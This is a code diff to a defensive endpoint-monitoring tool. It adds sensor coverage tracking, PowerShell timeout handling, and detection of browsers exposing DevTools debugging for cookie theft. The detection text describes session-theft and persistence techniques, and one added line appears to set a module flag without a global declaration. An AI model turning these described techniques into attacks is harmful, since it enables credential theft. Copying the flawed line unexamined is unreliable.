@@ -2130,6 +2130,24 @@ def _classify_linux(path):
 # a DEGRADED sensor rather than letting the silence read as "everything signed".
 _SIG_PROBE_FAILURES = 0
 
+# Every PowerShell-backed probe in this file is sized against ONE measurement: a
+# COLD powershell.exe on a real machine took 21.4s JUST TO START. A cap at or
+# near that is not a timeout, it is a coin flip on whether the interpreter
+# finished booting -- and this file's rule is that a probe which cannot answer
+# must return a non-answer, so a too-tight cap does not degrade gracefully. It
+# converts a working sensor into a permanent coverage gap on exactly the
+# machines that are slowest, and it does it silently.
+WIN_PS_COLD_START_CEILING = 90
+
+# Three call sites deliberately stay TIGHTER than the ceiling, because there a
+# hang costs more than a miss. They are the allowlist in
+# tests/test_powershell_timeouts.py, and adding a fourth means arguing for it:
+#   notify()                     25s  best-effort toast. The finding is already
+#                                     in the store and in status/report, and a
+#                                     90s hang would stall the scan that found it.
+#   _clipboard_read/_write()     30s  up to four calls in one deadfall cycle, so
+#                                     the worst case is 4x whatever this is.
+
 _WIN_SIG_PS = (
     "$s=Get-AuthenticodeSignature -LiteralPath $env:AEGIS_SIG_PATH;"
     "$sub=$null;if($s.SignerCertificate){$sub=$s.SignerCertificate.Subject};"
@@ -2139,11 +2157,10 @@ _WIN_SIG_PS = (
 def _classify_windows(path):
     global _SIG_PROBE_FAILURES
     result = {"trust": "unknown", "team": None, "authority": None}
-    # 90s, not 30s: a COLD powershell.exe on a real machine was measured at
-    # 21.4s just to start, and the old ceiling left almost no margin. A timeout
-    # here is not a cheap miss -- see below.
+    # The cold-start ceiling, not a local number: a timeout here is not a cheap
+    # miss -- see below.
     out, _, rc = run(["powershell", "-NoProfile", "-NonInteractive", "-Command",
-                      _WIN_SIG_PS], timeout=90,
+                      _WIN_SIG_PS], timeout=WIN_PS_COLD_START_CEILING,
                      extra_env={"AEGIS_SIG_PATH": path})
     if rc != 0 or not out:
         # The probe FAILED; that is not a verdict of "fine". suspicious_sig()
@@ -4673,7 +4690,25 @@ def _apply_correlations(db, new_events, now, initially_notified=False,
         elif decision == "learning":
             _auto_tolerate(db, incident_id, 0, now, reason="learning-period")
 
+# sensor ids that no longer exist -> what replaced them. Health rows are keyed
+# by id and read back whole, so a renamed sensor left its old row in
+# sensor_status forever: doctor reported "agent-surface-coverage DID NOT RUN"
+# (and the whole result DEGRADED) on the very first scan after the rename to
+# "coverage", and would have every scan after. A rename declares its
+# predecessor here; the row and any open coverage incident on it are retired.
+_RETIRED_SENSOR_IDS = {"agent-surface-coverage": "coverage"}
+
+
 def _record_health(db, health, now):
+    for old, new in _RETIRED_SENSOR_IDS.items():
+        if db.execute("DELETE FROM sensor_status WHERE sensor_id=?",
+                      (old,)).rowcount:
+            db.execute("UPDATE incidents SET status='RESOLVED',resolution=?,"
+                       "updated_at=?,last_seen=?,next_reminder_at=NULL WHERE "
+                       "correlation_key=? AND status IN (%s)" %
+                       ",".join("?" for _ in _ACTIVE_INCIDENT_STATES),
+                       ("sensor id retired; it is reported as %r now" % new,
+                        now, now, "sensor:" + old) + _ACTIVE_INCIDENT_STATES)
     for item in health:
         sensor_id = str(item.get("sensor_id") or "unknown")
         status = str(item.get("status") or "FAILED").upper()
@@ -4705,7 +4740,9 @@ def _record_health(db, health, now):
                     int(item.get("duration_ms") or 0),
                     int(item.get("item_count") or 0), detail, failures, episode))
         event_data = {"sensor_id": sensor_id, "status": status, "detail": detail,
-                      "consecutive_failures": failures}
+                      "consecutive_failures": failures,
+                      "duration_ms": int(item.get("duration_ms") or 0),
+                      "item_count": int(item.get("item_count") or 0)}
         cur = db.execute("INSERT INTO events(occurred_at,observed_at,source,event_type,"
                          "data_json) VALUES(?,?,?,?,?)",
                          (now, now, sensor_id, "sensor.health",
@@ -5392,15 +5429,238 @@ def get_sensor_health():
         db.close()
 
 
+# --- Scan cost: the resource budget, measured rather than assumed ---------- #
+# A monitor on a daily-driver machine has an overhead ceiling whether or not
+# anyone wrote it down. Written down: average CPU share, scan CPU over the
+# time between scans, including every command a scan spawns.
+SCAN_CPU_CEILING_PCT = 1.0
+
+
+def _cpu_seconds():
+    """CPU consumed by this process and every command it has waited on.
+    On Windows os.times() reports zero for children, so the share there
+    counts this interpreter only and undercounts every spawned command."""
+    t = os.times()
+    return t.user + t.system + t.children_user + t.children_system
+
+
+def _scan_cost_samples(limit=200):
+    """[(occurred_at, wall_ms, cpu_ms)] for the most recent scans, oldest
+    first. Read from the health EVENTS, which keep one row per scan, not from
+    sensor_status, which keeps only the latest."""
+    db = _event_connection()
+    try:
+        rows = db.execute(
+            "SELECT occurred_at, data_json FROM events WHERE source='scan.cost' "
+            "AND event_type='sensor.health' ORDER BY id DESC LIMIT ?",
+            (int(limit),)).fetchall()
+    finally:
+        db.close()
+    out = []
+    for row in rows:
+        try:
+            d = json.loads(row["data_json"])
+            out.append((int(row["occurred_at"]), int(d.get("duration_ms") or 0),
+                        int(d.get("item_count") or 0)))
+        except Exception:
+            continue
+    return sorted(out)
+
+
+def _scan_cost_summary(samples):
+    """{wall_p50_s, wall_p95_s, cpu_mean_s, share_pct, span_h, scans} over
+    the samples, or None below two of them (a share needs a span)."""
+    samples = sorted(samples)
+    if len(samples) < 2:
+        return None
+    # occurred_at carries one-second resolution, so two scans inside the same
+    # second measure a span of zero. That is a real observation window read
+    # through a coarse clock, not a missing one — and bailing to None there
+    # reported "no history yet" on exactly the hosts fast enough to scan twice
+    # in a second (which is how this line read green on Linux CI and populated
+    # on macOS from the same two scans). Worse, it blinded the case the line
+    # exists to catch: back-to-back scans are ~100% of their own window, so the
+    # share is over any ceiling and doctor has to say so. Floor the span at the
+    # clock's own resolution rather than discarding the observation.
+    span = max(samples[-1][0] - samples[0][0], 1)
+    walls = sorted(s[1] for s in samples)
+
+    def pct(q):
+        return walls[int(round((len(walls) - 1) * q))] / 1000.0
+
+    cpu = sum(s[2] for s in samples) / 1000.0
+    return {"wall_p50_s": pct(0.5), "wall_p95_s": pct(0.95),
+            "cpu_mean_s": cpu / len(samples),
+            "share_pct": 100.0 * cpu / span, "span_h": span / 3600.0,
+            "scans": len(samples)}
+
+
+# --- Coverage ledger: what a sensor FOUND and then could not examine ------ #
+# A sensor has two ways of not answering, and only one of them had a channel.
+# `return None` is the whole-sensor non-answer: _collect_sensor turns it into a
+# DEGRADED row and _scan_surfaces refuses to baseline it. But a sensor that
+# located a file, a process, a registry key -- and then could not stat, read or
+# parse it -- had nowhere to say so, and every one of those sites said nothing:
+# a bare `continue`, an `entries = []`, a `blocked = False`. Each is
+# byte-identical to "I examined it and it was clean". That is the shape behind
+# three separate audit findings on one day (an unparseable agent config that
+# recorded as exec-free; oversize configs that vanished from the surface; a
+# failed argv probe that manufactured "no debugging flag" against every
+# browser at once), and per the AST sweep that found them it recurred at ~50
+# sites across ~30 sensors. One ledger, one writer, one reader:
+#
+#   * a sensor calls unexamined(subject, why, exc) at the point it gives up on
+#     an item. It costs one line and never raises.
+#   * _collect_sensor / _scan_surfaces name the running sensor so the site does
+#     not have to know its own id, and note the gap on the sensor's health row.
+#   * check_coverage (collected after every sensor has run) emits ONE finding
+#     per sensor with gaps, fingerprinted on the set of subjects, so a stable
+#     gap is one incident the operator can judge and a changed gap re-alerts.
+#
+# The health row stays OK. _record_health opens a HIGH "coverage degraded"
+# incident on three consecutive non-OK rows, and that alarm is for a sensor
+# that stopped answering, not for one unreadable file in ~/Downloads; per-item
+# gaps flowing through DEGRADED would trip it within a day and teach the
+# operator to skip the coverage panel (snapshot_tcc's history). The finding
+# carries the gap instead, through the same dedup and verdict path as every
+# other finding.
+#
+# An item that was simply not there (ENOENT/ESRCH: a file that vanished between
+# listdir and stat, a process that exited, a registry key that does not exist)
+# is recorded as ABSENT: counted on the health row, never in the finding.
+# Nothing can be examined about a thing that is not there, and a hot directory
+# churns constantly; a finding that tracked that churn would be the noise the
+# risk tier already had to learn to discount.
+#
+# An item behind a PRIVILEGE WALL is recorded the same way. The agent runs
+# unprivileged by design (README/ARCHITECTURE forbid granting the shared
+# interpreter Full Disk Access), so a denial the operator cannot lift without
+# breaking that rule is the documented boundary, not a coverage fault: EPERM
+# anywhere (macOS TCC answers EPERM, and root-only stores like
+# /private/var/db/com.apple.backgroundtaskmanagement do too) and EACCES on a
+# path outside HOME. EACCES INSIDE HOME stays a real gap -- a file the
+# operator's own uid cannot read is anomalous. The first live install reported
+# the BTM store as a MEDIUM coverage finding every scan for exactly this.
+_CURRENT_SENSOR = [None]
+_UNEXAMINED = {}                 # sensor_id -> [(subject, why, state)]
+_GAP, _ABSENT, _PRIVILEGED = "gap", "absent", "privileged"
+_UNEXAMINED_CAP = 500            # per sensor per scan; past it, count only
+_UNEXAMINED_OVERFLOW = {}        # sensor_id -> entries dropped at the cap
+# Surfaces that register what RUNS: a gap there is a possible exec entry the
+# operator cannot see, not just a possible fact, so the finding is MEDIUM.
+_EXEC_REGISTERING_SENSORS = frozenset((
+    "persistence.snapshot", "persistence.diff", "surface.agent_surface",
+    "surface.shellrc", "surface.extra_persist", "surface.loginhooks",
+    "surface.git_hooks", "surface.python_site", "surface.btm_store",
+    "surface.profiles", "surface.profile_payloads", "surface.win_ifeo",
+    "surface.win_appinit", "surface.win_com_hijack",
+    "surface.win_wmi_subscriptions", "supply-chain", "cron",
+))
+
+
+def unexamined(subject, why, exc=None):
+    """Record that the running sensor found `subject` and could not examine it.
+
+    Never raises: this is called from inside except blocks, and a ledger that
+    can itself fail is a second silent path. `exc` classifies the gap -- a
+    not-there error is ABSENT (counted, never alarmed); anything else is a
+    real gap. Outside a scan the sensor id is "(direct)", which check_coverage
+    ignores, so by-hand calls and tests record without alerting."""
+    try:
+        subject, why = str(subject)[:240], str(why)[:160]
+        sid = _CURRENT_SENSOR[0] or "(direct)"
+        lst = _UNEXAMINED.setdefault(sid, [])
+        if len(lst) >= _UNEXAMINED_CAP:
+            _UNEXAMINED_OVERFLOW[sid] = _UNEXAMINED_OVERFLOW.get(sid, 0) + 1
+            return
+        lst.append((subject, why, _gap_state(subject, exc)))
+    except Exception:
+        pass
+
+
+def _gap_state(subject, exc):
+    """_ABSENT, _PRIVILEGED or _GAP for the error a probe raised on `subject`."""
+    if not isinstance(exc, OSError):
+        return _GAP
+    code = getattr(exc, "errno", None)
+    if isinstance(exc, FileNotFoundError) or code in (errno.ENOENT, errno.ESRCH):
+        return _ABSENT
+    if code == errno.EPERM:
+        return _PRIVILEGED
+    if code == errno.EACCES:
+        home = os.path.realpath(HOME)
+        try:
+            inside = os.path.realpath(subject).startswith(home + os.sep)
+        except Exception:
+            inside = subject.startswith(HOME)
+        return _GAP if inside else _PRIVILEGED
+    return _GAP
+
+
+def _reset_unexamined():
+    _UNEXAMINED.clear()
+    _UNEXAMINED_OVERFLOW.clear()
+
+
+def _gaps(sensor_id):
+    """[(subject, why)] the sensor could not examine; ABSENT and PRIVILEGED
+    ones excluded."""
+    return [(s, w) for s, w, state in _UNEXAMINED.get(sensor_id, ())
+            if state == _GAP]
+
+
+def _gap_kind(why):
+    """The KIND of a gap, from its `why`: the text before any ':' detail.
+    "is not parseable JSON: Expecting value" and "is not parseable JSON:
+    Extra data" are one kind. Identity for the coverage finding hangs on the
+    set of kinds, not the set of subjects (see check_coverage)."""
+    return (why or "").split(":", 1)[0].strip().lower()
+
+
+def _coverage_note(sensor_id):
+    """Health-row detail for a sensor with gaps, or "" when it has none."""
+    rows = _UNEXAMINED.get(sensor_id) or []
+    if not rows:
+        return ""
+    real = sum(1 for _s, _w, st in rows if st == _GAP)
+    gone = sum(1 for _s, _w, st in rows if st == _ABSENT)
+    walled = sum(1 for _s, _w, st in rows if st == _PRIVILEGED)
+    over = _UNEXAMINED_OVERFLOW.get(sensor_id, 0)
+    parts = []
+    if real:
+        parts.append("%d item(s) found but NOT examined (see the coverage "
+                     "finding)" % real)
+    if gone:
+        parts.append("%d item(s) gone before they could be read" % gone)
+    if walled:
+        parts.append("%d item(s) behind a privilege wall this unprivileged "
+                     "agent is not meant to cross" % walled)
+    if over:
+        parts.append("%d more past the ledger cap" % over)
+    return "; ".join(parts)
+
+
+def _run_as_sensor(sensor_id, fn, *args):
+    """Call fn with the ledger pointed at sensor_id, restoring it after."""
+    prior = _CURRENT_SENSOR[0]
+    _CURRENT_SENSOR[0] = sensor_id
+    try:
+        return fn(*args)
+    finally:
+        _CURRENT_SENSOR[0] = prior
+
+
 def _collect_sensor(sensor_id, fn, health, *args):
     started = time.monotonic()
     try:
-        result = fn(*args)
+        result = _run_as_sensor(sensor_id, fn, *args)
         status = "DEGRADED" if result is None else "OK"
         detail = "sensor returned no reliable snapshot" if result is None else ""
         output = [] if result is None else result
     except Exception as e:
         status, detail, output = "FAILED", str(e), []
+    if status == "OK":
+        detail = _coverage_note(sensor_id)
     duration = int((time.monotonic() - started) * 1000)
     health.append({"sensor_id": sensor_id, "status": status,
                    "detail": redact_sensitive(detail), "duration_ms": duration,
@@ -5431,7 +5691,8 @@ def _collect_prep(prep_id, fn, health):
     """
     started = time.monotonic()
     try:
-        value, status, detail = fn(), "OK", ""
+        value, status, detail = _run_as_sensor(prep_id, fn), "OK", ""
+        detail = _coverage_note(prep_id)
     except Exception as e:
         value, status, detail = None, "DEGRADED", str(e)
     health.append({"sensor_id": prep_id, "status": status,
@@ -6612,12 +6873,16 @@ def _iter_processes_live():
         try:
             pids = [d for d in os.listdir("/proc") if d.isdigit()]
         except Exception:
+            # Same rule as the mac and Windows legs below: no answer is not
+            # "no processes". This leg alone said nothing.
+            _PROC_ENUM_FAILED = True
             return
         for pid in pids:
             base = "/proc/" + pid
             try:
                 uid = str(os.stat(base).st_uid)
-            except Exception:
+            except Exception as e:
+                unexamined("pid %s" % pid, "could not be stat'd", e)
                 continue
             try:
                 exe = os.readlink(base + "/exe")
@@ -7095,12 +7360,23 @@ def check_behavior():
             continue
         seen.add(fp)
         command_sha = hashlib.sha256(argv.encode()).hexdigest()
+        # The operator is asked to judge this, and a hash gave them nothing to
+        # judge WITH: incident #347 (HIGH, fetch-plus-pipe-to-interpreter) sat
+        # open because "sha256=ccf3a161" cannot be attributed to anything. The
+        # retention rule permits exactly this -- only the hostile verdict and
+        # the evidence that earned it are written, and that evidence passes
+        # through redact_sensitive first -- and the paste guard already stores
+        # its command line the same way. The fingerprint stays on the hash so
+        # identity does not move when the redaction regexes do.
+        preview = re.sub(r"\s+", " ", redact_sensitive(argv)).strip()[:240]
         findings.append(finding(
             top, "behavior", "Suspicious process behavior",
-            "%s triggered [%s]; command sha256=%s" %
-            (base, names, command_sha[:16]),
+            "%s triggered [%s]; command sha256=%s; command: %s" %
+            (base, names, command_sha[:16], preview),
             fp, program=argv.split(None, 1)[0] if argv else "",
-            pid=pid, markers=[n for n, _ in signals], command_sha256=command_sha))
+            pid=pid, markers=[n for n, _ in signals], command_sha256=command_sha,
+            command_preview=preview))
+    _annotate_ancestry(findings)
     return findings
 
 
@@ -7130,7 +7406,8 @@ def check_xprotect(window_hours=None):
                 continue
             try:
                 ev = json.loads(line)
-            except Exception:
+            except Exception as e:
+                unexamined("an XProtect log record", "is not parseable JSON", e)
                 continue
             if not isinstance(ev, dict):
                 continue  # non-object ndjson record — skip, never fatal
@@ -7515,13 +7792,15 @@ def check_hot_dirs(max_age_days=14):
     for d in HOT_DIRS:
         try:
             entries = os.listdir(d)
-        except Exception:
+        except Exception as e:
+            unexamined(d, "could not be listed", e)
             continue
         for name in entries[:2000]:
             path = os.path.join(d, name)
             try:
                 st = os.stat(path)
-            except Exception:
+            except Exception as e:
+                unexamined(path, "could not be stat'd", e)
                 continue
             if IS_MAC and name.endswith(".app") and os.path.isdir(path):
                 # cutoff decided inside — bundle freshness is max(root, exe).
@@ -7600,7 +7879,8 @@ def check_staging(max_age_days=3):
     for d in STAGING_DIRS:
         try:
             entries = os.listdir(d)
-        except Exception:
+        except Exception as e:
+            unexamined(d, "could not be listed", e)
             continue
         for name in entries[:4000]:
             ioc = None
@@ -7613,7 +7893,8 @@ def check_staging(max_age_days=3):
             path = os.path.join(d, name)
             try:
                 st = os.stat(path)
-            except Exception:
+            except Exception as e:
+                unexamined(path, "could not be stat'd", e)
                 continue
             if st.st_mtime < cutoff:
                 continue
@@ -7778,7 +8059,8 @@ def _iter_package_manifests(cutoff):
                         bases = ([os.path.join(root, d, s) for s in os.listdir(
                             os.path.join(root, d))] if d.startswith("@") else
                             [os.path.join(root, d)])
-                    except OSError:
+                    except OSError as e:
+                        unexamined(os.path.join(root, d), "could not be listed", e)
                         continue
                     for pkg in bases[:500]:
                         mani = os.path.join(pkg, "package.json")
@@ -7812,7 +8094,8 @@ def check_supply_chain():
             path = os.path.join(base_root, name)
             try:
                 st = os.stat(path)
-            except OSError:
+            except OSError as e:
+                unexamined(path, "could not be stat'd", e)
                 continue
             if not os.path.isfile(path):
                 continue
@@ -7830,7 +8113,8 @@ def check_supply_chain():
         try:
             with open(mani, "r", encoding="utf-8", errors="replace") as fh:
                 data = json.load(fh)
-        except Exception:
+        except Exception as e:
+            unexamined(mani, "is not parseable JSON", e)
             continue
         if not isinstance(data, dict):
             continue
@@ -8945,8 +9229,11 @@ def snapshot_netconfig():
             })
     try:
         names = sorted(os.listdir(RESOLVER_DIR))[:_RESOLVER_ENTRY_CAP]
-    except Exception:
+    except FileNotFoundError:
         names = []          # absent on a stock Mac; absence is a real answer
+    except Exception as e:
+        unexamined(RESOLVER_DIR, "could not be listed", e)   # denied is not
+        names = []
     for name in names:
         p = os.path.join(RESOLVER_DIR, name)
         if not os.path.isfile(p):
@@ -9256,7 +9543,8 @@ def snapshot_python_site():
             names = sorted(n for n in os.listdir(d)
                            if n in _PY_STARTUP_FILES
                            or n.endswith(".pth"))[:_PY_SITE_ENTRY_CAP]
-        except Exception:
+        except Exception as e:
+            unexamined(d, "could not be listed", e)
             continue
         for name in names:
             p = os.path.join(d, name)
@@ -9457,7 +9745,8 @@ def snapshot_ext_caps():
             if not caps:
                 continue
             snap[label] = {"name": name[:80], "caps": caps, "broad": broad}
-        except Exception:
+        except Exception as e:
+            unexamined(label, "its manifest could not be examined: %s" % e, e)
             continue
     return snap
 
@@ -9604,7 +9893,8 @@ def snapshot_ide_ext():
         editor = os.path.basename(os.path.dirname(root))  # ".vscode", ".cursor"…
         try:
             entries = os.listdir(root)
-        except Exception:
+        except Exception as e:
+            unexamined(root, "could not be listed", e)
             continue
         for name in entries:
             if name.startswith(".") or name == "extensions.json":
@@ -9919,7 +10209,8 @@ def snapshot_btm_store():
     for d in BTM_STORE_DIRS:
         try:
             names = sorted(os.listdir(d))
-        except Exception:
+        except Exception as e:
+            unexamined(d, "could not be listed", e)
             continue
         for name in names:
             if not (name.startswith(_BTM_STORE_PREFIX)
@@ -10001,10 +10292,55 @@ def _listener_worth_tracking(path):
     return True
 
 
-def _parse_lsof_listeners(text):
+def _browser_loopback_entries(rows, argv_partial=None):
+    """{'loopback:<path>:<port>': path} for the loopback binds a BROWSER holds
+    without a debugging flag on its command line.
+
+    `argv_partial` is the one thing this sensor MUST consult before concluding
+    anything. Its whole claim is "no --remote-debugging behind this listener",
+    and _iter_processes falls back to the EXEC PATH when its argv `ps` call
+    fails -- a string that never contains the flag. So a failed argv probe does
+    not weaken this claim, it MANUFACTURES it, against every browser on the
+    machine at once. The process sensor already sets this flag and already
+    reports itself DEGRADED for it; the two simply never spoke, so the health
+    row said "argv incomplete" while this fired HIGH session-theft off exactly
+    that missing data. Defaults to the module flag; a parameter only so it can
+    be tested without faking a process table.
+
+    Returning {} is safe rather than a false empty: these keys exist ONLY in the
+    alarm case (a browser opens a loopback listener for exactly one thing), so
+    a scan that declines to answer adds nothing and removes nothing, and the
+    recovery scan re-adds whatever is genuinely there.
+
+    Loopback listeners are dropped everywhere else in this surface (dev
+    servers churn on 127.0.0.1 constantly), and a browser is the one exception
+    worth the key: a Chromium browser opens a local TCP listener for exactly
+    one thing, DevTools remote debugging, and every path to plaintext cookies
+    from a live profile goes through it. A browser STARTED with
+    --remote-debugging-port is check_browser_automation's case and is skipped
+    here so one fact is not reported twice; what is left is the listener with
+    no flag behind it — CDP enabled in memory (injected into the running
+    browser), which no argv sensor can see. `rows` are (path, port, argv)."""
+    if argv_partial is None:
+        argv_partial = _PROC_ARGV_PARTIAL
+    if argv_partial:
+        return {}
+    out = {}
+    for path, port, argv in rows:
+        if not path or not _BROWSER_EXE_RE.search(path.strip()):
+            continue
+        if "--remote-debugging" in (argv or ""):
+            continue
+        out["loopback:%s:%s" % (path, port)] = path
+    return out
+
+
+def _parse_lsof_listeners(text, loopback=False):
     """{pid: set(addr)} of NON-loopback TCP listen sockets from `lsof -Fpn`
     machine output (p<pid> / n<addr> field lines). IPv6 brackets handled;
-    127.0.0.1 / ::1 / localhost binds dropped — unreachable from outside."""
+    127.0.0.1 / ::1 / localhost binds dropped — unreachable from outside.
+    `loopback=True` inverts the filter and returns ONLY those binds (for
+    _browser_loopback_entries); the default is unchanged."""
     out = {}
     pid = None
     for line in (text or "").splitlines():
@@ -10015,15 +10351,16 @@ def _parse_lsof_listeners(text):
             pid = val
         elif tag == "n" and pid is not None and ":" in val:
             host = val.rsplit(":", 1)[0].strip("[]")
-            if host in ("127.0.0.1", "::1", "localhost"):
+            if (host in ("127.0.0.1", "::1", "localhost")) != loopback:
                 continue
             out.setdefault(pid, set()).add(val)
     return out
 
 
-def _parse_proc_net_tcp(text):
+def _parse_proc_net_tcp(text, loopback=False):
     """Pure parser: /proc/net/tcp[6] → [(port, uid, inode)] for sockets in state
-    0A (LISTEN) bound to a NON-loopback address. Addresses are little-endian
+    0A (LISTEN) bound to a NON-loopback address (`loopback=True`: ONLY the
+    loopback ones). Addresses are little-endian
     hex; loopback is 0100007F (v4) or ...0100 (v6 ::1), and 00000000 is the
     wildcard 0.0.0.0 — reachable, so kept.
 
@@ -10044,8 +10381,9 @@ def _parse_proc_net_tcp(text):
         except ValueError:
             continue
         a = addr_hex.upper()
-        if a in ("0100007F",                                  # 127.0.0.1
-                 "00000000000000000000000001000000"):         # ::1
+        is_loop = a in ("0100007F",                           # 127.0.0.1
+                        "00000000000000000000000001000000")   # ::1
+        if is_loop != loopback:
             continue
         rows.append((str(port), parts[7], parts[9]))
     return rows
@@ -10090,13 +10428,14 @@ def _linux_socket_inode_pids():
 
 
 def _snapshot_listeners_linux():
-    rows = []
+    rows, loop = [], []
     for proc_file in ("/proc/net/tcp", "/proc/net/tcp6"):
         text = _read_text(proc_file, limit=4 * 1024 * 1024)
         if text is None:
             continue
         rows.extend(_parse_proc_net_tcp(text))
-    if not rows:
+        loop.extend(_parse_proc_net_tcp(text, loopback=True))
+    if not rows and not loop:
         # /proc/net/tcp always exists on Linux; unreadable ⇒ non-answer.
         if not os.path.exists("/proc/net/tcp"):
             return None
@@ -10118,12 +10457,19 @@ def _snapshot_listeners_linux():
         # upgrade). The uid rides in the VALUE, which no diff compares —
         # diff_listeners has no changed_fn, so only new keys ever fire.
         snap["%s:%s" % (path or "?", port)] = {"path": path or "?", "uid": uid}
+    if loop:
+        procs = {p: (exe, argv) for p, _o, exe, argv in _iter_processes()}
+        rows = []
+        for port, _uid, inode in loop:
+            exe, argv = procs.get(inode_pid.get(inode), ("", ""))
+            rows.append((exe, port, argv))
+        snap.update(_browser_loopback_entries(rows))
     return snap
 
 
-def _parse_netstat_listen_windows(text):
+def _parse_netstat_listen_windows(text, loopback=False):
     """Pure parser: `netstat -ano` → [(port, pid)] for non-loopback TCP
-    LISTENING rows."""
+    LISTENING rows (`loopback=True`: ONLY the loopback ones)."""
     rows = []
     for line in (text or "").splitlines():
         parts = line.split()
@@ -10136,7 +10482,7 @@ def _parse_netstat_listen_windows(text):
         if not port.isdigit():
             continue
         host = host.strip("[]")
-        if host in ("127.0.0.1", "::1"):
+        if (host in ("127.0.0.1", "::1")) != loopback:
             continue
         rows.append((port, parts[4]))
     return rows
@@ -10163,13 +10509,18 @@ def _snapshot_listeners_windows():
     out, rc = _netstat_tcp_rows()
     if rc != 0 or not out:
         return None  # non-answer: netstat always prints a header when it runs
-    pid_exe = {pid: exe for pid, _o, exe, _a in _iter_processes()}
+    procs = {pid: (exe, argv) for pid, _o, exe, argv in _iter_processes()}
     snap = {}
     for port, pid in _parse_netstat_listen_windows(out):
-        path = pid_exe.get(pid)
+        path = procs.get(pid, ("", ""))[0]
         if not _listener_worth_tracking(path):
             continue
         snap["%s:%s" % (path or "?", port)] = path or "?"
+    rows = []
+    for port, pid in _parse_netstat_listen_windows(out, loopback=True):
+        exe, argv = procs.get(pid, ("", ""))
+        rows.append((exe, port, argv))
+    snap.update(_browser_loopback_entries(rows))
     return snap
 
 
@@ -10202,6 +10553,18 @@ def snapshot_listeners():
             continue
         for port in sorted({a.rsplit(":", 1)[1] for a in addrs}):
             snap["%s:%s" % (path or "?", port)] = path or "?"
+    loop = _parse_lsof_listeners(out, loopback=True)
+    if loop:
+        # Resolved from the scan-wide process snapshot, not a `ps` per pid: a
+        # dev box holds dozens of loopback listeners and they used to cost
+        # nothing.
+        procs = {p: (exe, argv) for p, _o, exe, argv in _iter_processes()}
+        rows = []
+        for pid, addrs in loop.items():
+            exe, argv = procs.get(pid, ("", ""))
+            for port in sorted({a.rsplit(":", 1)[1] for a in addrs}):
+                rows.append((exe, port, argv))
+        snap.update(_browser_loopback_entries(rows))
     return snap
 
 
@@ -10215,6 +10578,35 @@ def diff_listeners(prior, cur):
         else:
             path, uid = val, None
         port = key.rsplit(":", 1)[1]
+        if key.startswith("loopback:"):
+            # ATTACK-DEFINED, declared rather than left implicit. The subject
+            # here is a Chromium binary, which is always validly signed by
+            # Google — so grading custody on it the way the sibling
+            # net-listener finding does would demote a genuine in-memory CDP
+            # injection every single time, on the strength of Google's
+            # signature. _grade_binary(attack_defined=True) is the existing
+            # way to say "this evidence is not demotable by provenance": it
+            # returns the severity untouched and no rung, and passing that
+            # rung records the decision at the call site, which is what the
+            # custody roster asks for. A listener with no
+            # --remote-debugging-port has no benign reading.
+            graded, rung, _note = _grade_binary("HIGH", path,
+                                                attack_defined=True)
+            return finding(
+                graded, "session-theft",
+                "Browser accepting a local debug connection",
+                "%s is listening on loopback port %s with no "
+                "--remote-debugging-port on its command line. A Chromium "
+                "browser opens a local TCP listener for one thing — DevTools "
+                "remote debugging — so a listener that appeared without the "
+                "flag is the in-memory enable (CDP injected into the running "
+                "browser). Anything on this machine can read your live cookies "
+                "as PLAINTEXT through it, which defeats MFA. If you did not "
+                "start this, freeze the browser: aegis.py freeze <pid>."
+                % (os.path.basename(path), port),
+                "listener:%s" % key, path=path, port=port, confidence="high",
+                custody=rung,
+                markers=["session-theft", "cookie", "browser-automation"])
         resolvable = path.startswith("/") or (IS_WIN and ":" in path[:3])
         trust = classify_signature(path)["trust"] if resolvable else "unknown"
         # On Linux there is no signature to lean on, so the hostile shape is
@@ -10446,7 +10838,11 @@ def _outbound_rows():
                 continue
             try:
                 path = os.readlink("/proc/%s/exe" % pid)
-            except Exception:
+            except Exception as e:
+                # The connection is real; only its owner is unknown. Dropping
+                # the row hid a live outbound TCP session behind a read error.
+                unexamined("pid %s -> %s:%s" % (pid, rip, rport),
+                           "its executable could not be read", e)
                 continue
             out.append((path, rip, rport))
         return out
@@ -10702,7 +11098,8 @@ def snapshot_suid():
                 p = os.path.join(root, name)
                 try:
                     st = os.lstat(p)
-                except OSError:
+                except OSError as e:
+                    unexamined(p, "could not be stat'd", e)
                     continue
                 if stat.S_ISLNK(st.st_mode) or not stat.S_ISREG(st.st_mode):
                     continue
@@ -10889,14 +11286,19 @@ def snapshot_com_hijack():
             i += 1
             try:
                 ck = winreg.OpenKey(root, clsid)
-            except OSError:
+            except OSError as e:
+                unexamined("CLSID %s" % clsid, "could not be opened", e)
                 continue
             with ck:
                 for server in ("InprocServer32", "LocalServer32"):
                     try:
                         with winreg.OpenKey(ck, server) as sk:
                             val, _t = winreg.QueryValueEx(sk, "")
-                    except OSError:
+                    except OSError as e:
+                        # A missing server subkey is the normal shape (most
+                        # CLSIDs have one, not both): ENOENT stays absent.
+                        unexamined("CLSID %s\\%s" % (clsid, server),
+                                   "could not be read", e)
                         continue
                     if isinstance(val, str) and val.strip():
                         snap["%s\\%s" % (clsid, server)] = val
@@ -10980,7 +11382,10 @@ def snapshot_ifeo():
                 try:
                     with winreg.OpenKey(root, name) as sk:
                         val, _t = winreg.QueryValueEx(sk, value_name)
-                except OSError:
+                except OSError as e:
+                    # Most IFEO keys carry no Debugger value: ENOENT is absent.
+                    unexamined("%s\\%s" % (subkey, name),
+                               "its %s value could not be read" % value_name, e)
                     continue
                 if isinstance(val, str) and val.strip():
                     snap["%s:%s" % (prefix, name)] = val
@@ -11059,7 +11464,8 @@ def snapshot_appinit():
         with k:
             try:
                 val, _t = winreg.QueryValueEx(k, "AppInit_DLLs")
-            except OSError:
+            except OSError as e:
+                unexamined(subkey, "its AppInit_DLLs value could not be read", e)
                 continue
             if isinstance(val, str) and val.strip():
                 snap[subkey] = val.strip()
@@ -11723,8 +12129,14 @@ _WIN_REMOTE_SESSION_PS = (
 
 
 def _snapshot_auth_sessions_win():
+    # 30s here was below the cold-start ceiling, and it showed: this probe and
+    # the signature probe -- the only two things that reach the OS through the
+    # same run(["powershell", ...]) call -- each flaked once in a single CI
+    # session, both green on rerun. The signature probe had already been raised
+    # for exactly this reason; this one never was.
     out, _, rc = run(["powershell", "-NoProfile", "-NonInteractive", "-Command",
-                      _WIN_REMOTE_SESSION_PS], timeout=30)
+                      _WIN_REMOTE_SESSION_PS],
+                     timeout=WIN_PS_COLD_START_CEILING)
     # Probe failure ⇒ non-answer, same rule every other Windows PS-backed
     # surface here follows (snapshot_win_exclusions et al.) — never a false
     # empty that would storm the moment the probe next succeeds.
